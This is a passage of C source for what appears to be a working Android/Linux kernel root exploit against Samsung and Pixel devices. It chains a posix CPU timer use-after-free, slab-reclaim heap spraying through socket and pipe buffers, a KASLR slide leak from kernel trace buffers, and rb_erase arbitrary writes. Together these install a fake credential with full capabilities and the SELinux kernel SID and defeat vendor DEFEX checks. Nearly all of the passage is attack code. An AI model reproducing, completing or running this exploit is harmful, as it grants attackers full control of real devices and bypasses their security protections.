         * /proc/<pid>/loginuid, which is world-readable (panic_on_warn is
         * root-only on Samsung builds and cannot serve as the probe).
         * Mode 4's value is fully predictable ((V & ~0x1fff) + 0x1000),
         * so the read-back is a byte-exact check of the pipeline; mode 0
         * then proves the zero write.  Without a verified probe the
         * zombie is never reaped: a reap with stale nodes is a guaranteed
         * kernel panic.
         */
        struct plant_res r;
        int a, ok = 0;
        long got;
        unsigned int want = 0;

        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 88, 4, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        if (ok)
            want = (unsigned int)((((r.A - 0x78) & ~0x1fffULL) + 0x1000) &
                                  0xffffffffULL);
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != (long)want)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d probe (nonzero) unverified "
                 "want=%#x got=%ld -- held\n", tag, z, want, got);
            g_held++;
            return;
        }
        ok = 0;
        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 89, 0, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != 0)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d probe (zero) unverified "
                 "got=%ld -- held\n", tag, z, got);
            g_held++;
            return;
        }
    }
    for (int i = 0; i < 3; i++)
    {
        struct plant_res r;
        int a, ok = 0;

        for (a = 0; a < 3; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + slots[i], 90 + i, 0, &r, raw, 0);
            if (r.ok)
            {
                ok = 1;
                break;
            }
            if (!r.retry)
                break;
        }
        if (!ok)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d repair[%d] failed -- held\n",
                 tag, z, i);
            g_held++;
            return;
        }
    }
    g_repairing = 0;
    kill(z, SIGKILL);
    {
        int st = 0;

        if (waitpid(z, &st, 0) == z)
            logf("[+] plant%d zombie %d repaired+reaped (st=%#x)\n",
                 tag, z, st);
        else
            logf("[!] plant%d zombie %d reap failed\n", tag, z);
    }
}

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out, unsigned long long static_target){
    struct plant_res r;

    /* Retries pick a fresh victim each time (run_plant re-selects), so more
     * attempts directly raise the success rate; a success costs one plant. */
    for (int attempt = 1; attempt <= 5; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw, static_target);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 10
#define SPRAY_SOCKS 4096
#define SPRAY_PRE 4000
/* Phase 2 fires after the parent already sees the victim page free; the
 * catch happens in phase 1's continuous writes (rate, not volume).  A few
 * thousand post writes are plenty of margin -- 20000 just churned 1.6GB of
 * skbs per plant and cost seconds across the chain. */
#define SPRAY_POST 3000
#define PIPE_SPRAY_N 128
#define PIPE_PAGES_PER 4
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];  /* zero-mode plants; drained each time */
static int g_fpool[SPRAY_SOCKS][2]; /* mode-2 fake cred; never drained on success */
static int g_fpool_n;
static int g_pool_n;
static int g_rawfd[TRACE_CPUS] = {[0 ... TRACE_CPUS-1] = -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int (*pool)[2];
    int pool_n;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    /*
     * Separate pool for the mode-2 fake-cred plant: its reclaimed page holds
     * the fake cred that task->cred points at, so it must never be drained
     * once the plant succeeds.  Every later zero-mode plant drains only
     * g_pool.
     */
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_fpool[i]))
            break;
        setsockopt(g_fpool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_fpool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_fpool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < TRACE_CPUS; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

/*
 * Order-0 reclaim channel (GhostKey reclaim_pipe).  A pipe write of a 4KB
 * buffer allocates an order-0 pipe page holding our bytes.  V's freed
 * posix_timers_cache slab is order-1, so it splits into two order-0 pages in
 * the buddy; an order-0 pipe page then lands on the half containing the stale
 * node.  Copy a whole page with the fake node at the node's 4KB offset into
 * each pipe buffer.
 */
static int g_pspray[PIPE_SPRAY_N][2];
static int g_npspray;

/*
 * Diagnostic: dump every trace line mentioning the victim pfn so we can see
 * exactly which alloc/free touched V's page (order, pid) and whether it was
 * our spray's payload frag or something else.
 *
 * [trace] diagnostics commented out -- bring-up is done, the dump is pure
 * noise (and scans up to 200k trace lines per call).  Restore the body
 * below to re-enable.
 */
static void dump_victim_trace(unsigned long long pfn)
{
    (void)pfn;
    /*
    char line[768];
    char needle[40];
    FILE *f = fopen(TR "/trace", "r");
    int shown = 0, scanned = 0;

    if (!f)
        return;
    snprintf(needle, sizeof(needle), "pfn=%#llx", pfn);
    logf("[trace] --- events mentioning %s ---\n", needle);
    while (fgets(line, sizeof(line), f) && shown < 24 && scanned < 200000)
    {
        scanned++;
        if (strstr(line, needle))
        {
            logf("[trace] %s", line);
            shown++;
        }
    }
    fclose(f);
    logf("[trace] --- end (%d lines, scanned %d) ---\n", shown, scanned);
    */
}

static void pipe_spray(unsigned node_off, unsigned long long target)
{
    unsigned char page[4096];

    if (node_off + 24 > 4096)
        return;
    memset(page, 0, sizeof(page));
    {
        uint64_t *node = (uint64_t *)(page + node_off);

        node[0] = 0;
        node[1] = 0;
        node[2] = target;
    }
    /* Create the pipes once; later calls only append pages (a full pipe
     * just returns EAGAIN, and re-calling pipe() on the same slot would
     * leak the old fds and their kernel pages). */
    if (!g_npspray)
    {
        for (int i = 0; i < PIPE_SPRAY_N; i++)
        {
            if (pipe(g_pspray[i]))
                break;
            fcntl(g_pspray[i][1], F_SETFL, O_NONBLOCK);
            fcntl(g_pspray[i][0], F_SETFL, O_NONBLOCK);
            g_npspray++;
        }
    }
    for (int i = 0; i < g_npspray; i++)
        for (int k = 0; k < PIPE_PAGES_PER; k++)
            if (write(g_pspray[i][1], page, 4096) != 4096)
                break;
}

/*
 * Free the pages one spray left queued.  Without this each plant attempt
 * pins ~1.5-2GB of skb data; the fake-mode stage writes (times retries)
 * then exhaust memory and the kernel panics with "System is deadlocked on
 * memory".  `fake` selects which pool to drain: the fake-cred pool may only
 * be drained on FAILED attempts (a success holds the live fake cred).
 */
static void drain_spray(int fake)
{
    static unsigned char sink[65536];
    int (*pool)[2] = fake ? g_fpool : g_pool;
    int n = fake ? g_fpool_n : g_pool_n;

    for (int i = 0; i < n; i++)
    {
        ssize_t rd;

        do
            rd = recv(pool[i][1], sink, sizeof(sink), MSG_DONTWAIT);
        while (rd > 0);
    }
    if (!fake)
    {
        for (int i = 0; i < g_npspray; i++)
        {
            ssize_t rd;

            do
                rd = read(g_pspray[i][0], sink, sizeof(sink));
            while (rd > 0);
        }
    }
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        usleep(200);
    if (atomic_load(&g_stop_spray))
        return NULL;
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    /*
     * Trace from before the fork: copy_process()'s task_struct allocation is
     * what gives the failure path T's task address for the zombie repair.
     */
    trace_start();
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        trace_stop();
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        trace_stop();
        return;
    }
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long T_task = 0;

    if (n > 0)
    {
        /*
         * Only trust an unambiguous capture: the window must contain
         * exactly one task_struct alloc for our pid (T's fork).  Anything
         * else means the scan is matching something we do not understand,
         * and writing through a wrong "task" address corrupts kernel
         * memory -- so treat it as no capture and hold instead.
         */
        int tcnt = scan_task_allocs(raw, (size_t)n, (int)getpid(), &T_task,
                                    NULL,
                                    g_slide_set
                                        ? TASK_SITE_STATIC +
                                              (unsigned long long)g_slide
                                        : 0);

        if (tcnt != 1 || !T_task || (T_task & 0x3f))
        {
            logf("[-] plant%d task capture ambiguous (n=%d task=%#llx)\n",
                 tag, tcnt, T_task);
            T_task = 0;
        }
    }
    logf("[plant%d] T=%d task=%#llx\n", tag, T, T_task);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    if (!g_slide_set || site0 != STATIC_TIMER_SITE + g_slide) {
        kill(T, SIGKILL); waitpid(T, NULL, 0); trace_stop();
        logf("[-] timer allocation site disagrees with verified profile\n");
        return;
    }
    /* Static target: resolve against the slide learned from this plant. */
    if (static_target)
        target = static_target + (unsigned long long)g_slide;

    unsigned long long page = V & ~0x1fffULL;
    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            /*
             * The posix-cpu-timers exit loop keeps deleting head->next and
             * timerqueue_del() first does head->next = rb_next(node).
             * rb_next() returns NULL only for an RB_EMPTY_NODE, i.e. when
             * the parent color equals the node address.  Therefore the
             * value rb_erase() writes into task->cred (the parent color)
             * has to be the node address itself, and the fake cred must be
             * overlaid on the stale node.  That takes the
             * WARN_ON_ONCE(RB_EMPTY_NODE) in timerqueue_del; calling it is
             * safe because the fake path pre-zeroes panic_on_warn.
             *
             * After the erase (6.1 cred layout):
             *   +0x00 usage|uid = parent color A (uid is dirty)
             *   +0x08 gid|suid  = target, written by __rb_change_child
             *   +0x10 sgid|euid = rb_left (target)
             * uid and euid are repaired by later zero plants; suid/sgid
             * keep the target value, which is harmless for the exec.
             */
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb0 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b < off + 0xb0 && off < b + 0x40)
                    continue;
                blob = b;
                fit = 1;
                break;
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            {
                unsigned char *pc = payload + off;

                build_payload(payload, off, V + 0x78, target);
                /* The node fields at +0x00 and +0x10 are already set; fill
                 * in the rest of the fake cred around them. */
                *(unsigned long long *)(pc + 0x28) = FULLCAP; /* inherit */
                *(unsigned long long *)(pc + 0x30) = FULLCAP; /* permitted */
                *(unsigned long long *)(pc + 0x38) = FULLCAP; /* effective */
                *(unsigned long long *)(pc + 0x40) = FULLCAP; /* bset */
                *(unsigned long long *)(pc + 0x48) = FULLCAP; /* ambient */
                *(unsigned long long *)(pc + 0x78) = page + blob;
                *(unsigned long long *)(pc + 0x80) =
                    ROOT_USER_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x88) =
                    INIT_USER_NS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x90) =
                    INIT_UCOUNTS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x98) =
                    INIT_GROUPS_STATIC + g_slide;
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                    SELINUX_SID_KERNEL;                    /* osid */
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                    SELINUX_SID_KERNEL;                    /* sid */
                logf("[+] plant%d fake cred at=%#llx blob=%#zx "
                     "sec=%#llx\n", tag, V + 0x78, blob, page + blob);
            }
        }
        else if (mode == 4)
        {
            /*
             * Arbitrary "non-zero pointer" write: rb_erase writes
             * parent_color (= our page address, non-zero) into rb_left
             * (the target).  parent = parent_color & ~3 points into our
             * page, so the __rb_change_child side effect
             * (*(parent+8) = rb_left) lands on payload+0x1008 — harmless.
             * Used for DEFEX gates that test != 0.
             */
            unsigned long long page = V & ~0x1fffULL;

            build_payload(payload, off, page + 0x1000, target);
            logf("[+] plant%d arb write target=%#llx value=%#llx\n",
                 tag, target, page + 0x1000);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx fake=%#llx node=%#llx pfn=%#llx "
             "slab=%#llx slide=%#llx recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, V + 0x78, pfn, slab_pfn, g_slide,
             nrec, slab_own, g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = (mode == 2 ? g_fpool_n : g_pool_n) / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].pool = (mode == 2) ? g_fpool : g_pool;
            args[i].pool_n = (mode == 2) ? g_fpool_n : g_pool_n;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i % TRACE_CPUS;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        /*
         * The trigger never exited, so the exec/kill chain stalled and
         * timer-go was already written.  If the exec thread (etid) still
         * exists, de_thread() has not run: exec has not reached
         * posix_cpu_timers_exit(), the timers are still live and a normal
         * kill/reap will dequeue them through siglock, without touching a
         * stale node.  That makes the retry safe.
         */
        int exec_tid_alive = etid &&
                             syscall(SYS_tgkill, T, etid, 0) == 0;

        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (exec_tid_alive)
        {
            /*
             * Kill the stalled trigger to stop its helpers.  The node may
             * be stale if the exec teardown raced, so the reap is made safe
             * first (repair_zombie empties the timer queues), then the
             * trigger is reaped and no zombie is left behind.
             */
            kill(T, SIGKILL);
            logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
                 "still alive); killed, repairing+reaping\n",
                 tag, si.si_code, si.si_status, etid);
            repair_zombie(T, T_task, raw, tag);
            res->retry = 1;
            return;
        }
        logf("[-] plant%d no zombie (code=%d status=%d); repairing+reaping\n",
             tag, si.si_code, si.si_status);
        /* Kill first so no live timer can re-arm a queue leftmost while the
         * repair writes run; cleanup only happens at reap on this kernel. */
        kill(T, SIGKILL);
        repair_zombie(T, T_task, raw, tag);
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap code=%d status=%d not SIGKILL; repairing+reaping\n",
             tag, si.si_code, si.si_status);
        repair_zombie(T, T_task, raw, tag);
        return;
    }
    /*
     * Order-1 reclaim only: android.hardwar consumes order-0 pages as soon as
     * V's slab splits, so an order-0 spray loses the race.  An order-1 frag
     * claims the whole freed slab before it ever splits.  Phase 1 must already
     * be spraying when the free happens (no free-detect delay), so keep both
     * phases running continuously.
     */
    atomic_store(&g_burst, 1);
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < TRACE_CPUS && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
                dump_victim_trace(slab_pfn);
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                /*
                 * Order-0 reclaim the instant V's page is freed, before the
                 * system processes (kmxservice/knox) grab it.  Zero-mode
                 * only: a pipe page carries a parent=0 node, and in mode 2
                 * that would NULL task->cred instead of installing the fake
                 * cred.
                 */
                if (mode != 2)
                    pipe_spray((unsigned)((V + 0x78) & 0xfff), target);
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    /*
     * Do NOT drain yet on the success path: the rb_erase write fires from
     * release_task() during waitpid(T) below, so the payload page at V+0x78
     * must stay allocated until then.
     */
    trace_stop();
    for (int cpu = 0; cpu < TRACE_CPUS && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    dump_victim_trace(slab_pfn);
    if (!hit)
    {
        /*
         * The victim slab can stay in SLUB's partial list instead of
         * returning to the buddy allocator, so the spray never sees its
         * pfn.  Keep the zombie (the stale node is not erased while it is
         * unreaped) and let stage_write pick a new victim.
         */
        logf("[-] plant%d burst missed; repairing+reaping; retryable\n", tag);
        /* No erase will use this payload (the stale node is not the one the
         * repair touches), so reclaim the spray memory before the repair's
         * own plants run against empty pools. */
        drain_spray(mode == 2);
        repair_zombie(T, T_task, raw, tag);
        res->retry = 1;
        return;
    }

    usleep(1000);
    int st = 0, reaped = 0;

    /*
     * The trigger child is normally SIGKILLed by its killer helper once the
     * exec thread dies, which runs the task cleanup (the rb_erase write).
     * On this kernel that helper sometimes never sees the exec thread die, so
     * a blocking waitpid hangs the whole exploit and the stuck process
     * eventually panics the device.  Wait with a timeout instead and SIGKILL
     * the child ourselves if needed: SIGKILL still runs do_exit and thus the
     * cleanup_timerqueue write, while never hanging.
     */
    for (int i = 0; i < 300 && !reaped; i++)
    {
        pid_t rp = waitpid(T, &st, WNOHANG);

        if (rp == T)
        {
            reaped = 1;
            break;
        }
        if (rp < 0)
            break;
        usleep(10000);
    }
    if (!reaped)
    {
        kill(T, SIGKILL);
        waitpid(T, &st, 0);
    }
    logf("[+] plant%d reaped status=%#x (reaped=%d)\n", tag, st, reaped);
    /* The erase already fired inside release_task() above, so the payload
     * page is no longer needed: reclaim the spray memory. */
    if (mode != 2)
        drain_spray(0);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    const char *worker_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0, task_site = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)worker_mode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            /*
             * Scan dup_task_struct's allocation independently (matched by
             * size only, no site filter) so its call site is a second and
             * third independent measurement of this boot's KASLR slide,
             * not one derived from the cred site.
             */
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task,
                                  &task_site, 0);
        }
        /*
         * Exactly one task_struct alloc is required (the fork's
         * dup_task_struct), but the cred scan may see more than one
         * prepare_creds: the exec installs the FIRST one via commit_creds
         * and later transient creds (do_faccessat's alloc/free) reuse that
         * same-sized slab.  scan_cred_allocs keeps the first, so accept
         * any count >= 1 and verify the first site against the slide.
         */
        if (R && task && c >= 1 && tc == 1)
        {
            unsigned long long slide_cred = site - CRED_SITE_STATIC;
            unsigned long long slide_task = task_site - TASK_SITE_STATIC;

            /*
             * Require all three allocation sites (timer, credential, task)
             * to resolve to the same KASLR slide before a root attempt is
             * allowed.  Any disagreement means a mis-scan and would write
             * through a wrong kernel address.
             */
            if (slide_in_range(slide_cred) && slide_in_range(slide_task) &&
                slide_cred == g_slide && slide_task == g_slide)
            {
                struct pollfd pf = {.fd = st[0], .events = POLLIN};

                if (poll(&pf, 1, 2000) > 0 &&
                    read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                    hello == CHILD_HELLO)
                {
                    g_slide_set = 1;
                    logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                         "recs=%d task=%#llx task_site_low=%#llx task_recs=%d "
                         "slide=%#llx (3 sites agree)\n",
                         attempt, p, R, site & 0x1fffff, c, task,
                         task_site & 0x1fffff, tc, g_slide);
                    *out_pid = p;
                    *out_go = go[1];
                    *out_st = st[0];
                    *task_out = task;
                    return R;
                }
            }
            else
            {
                logf("[cred] slides disagree: cred=%#llx task=%#llx "
                     "timer=%#llx\n",
                     slide_cred, slide_task, g_slide);
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_site=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, task_site, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

#include "pixel_main.inc"
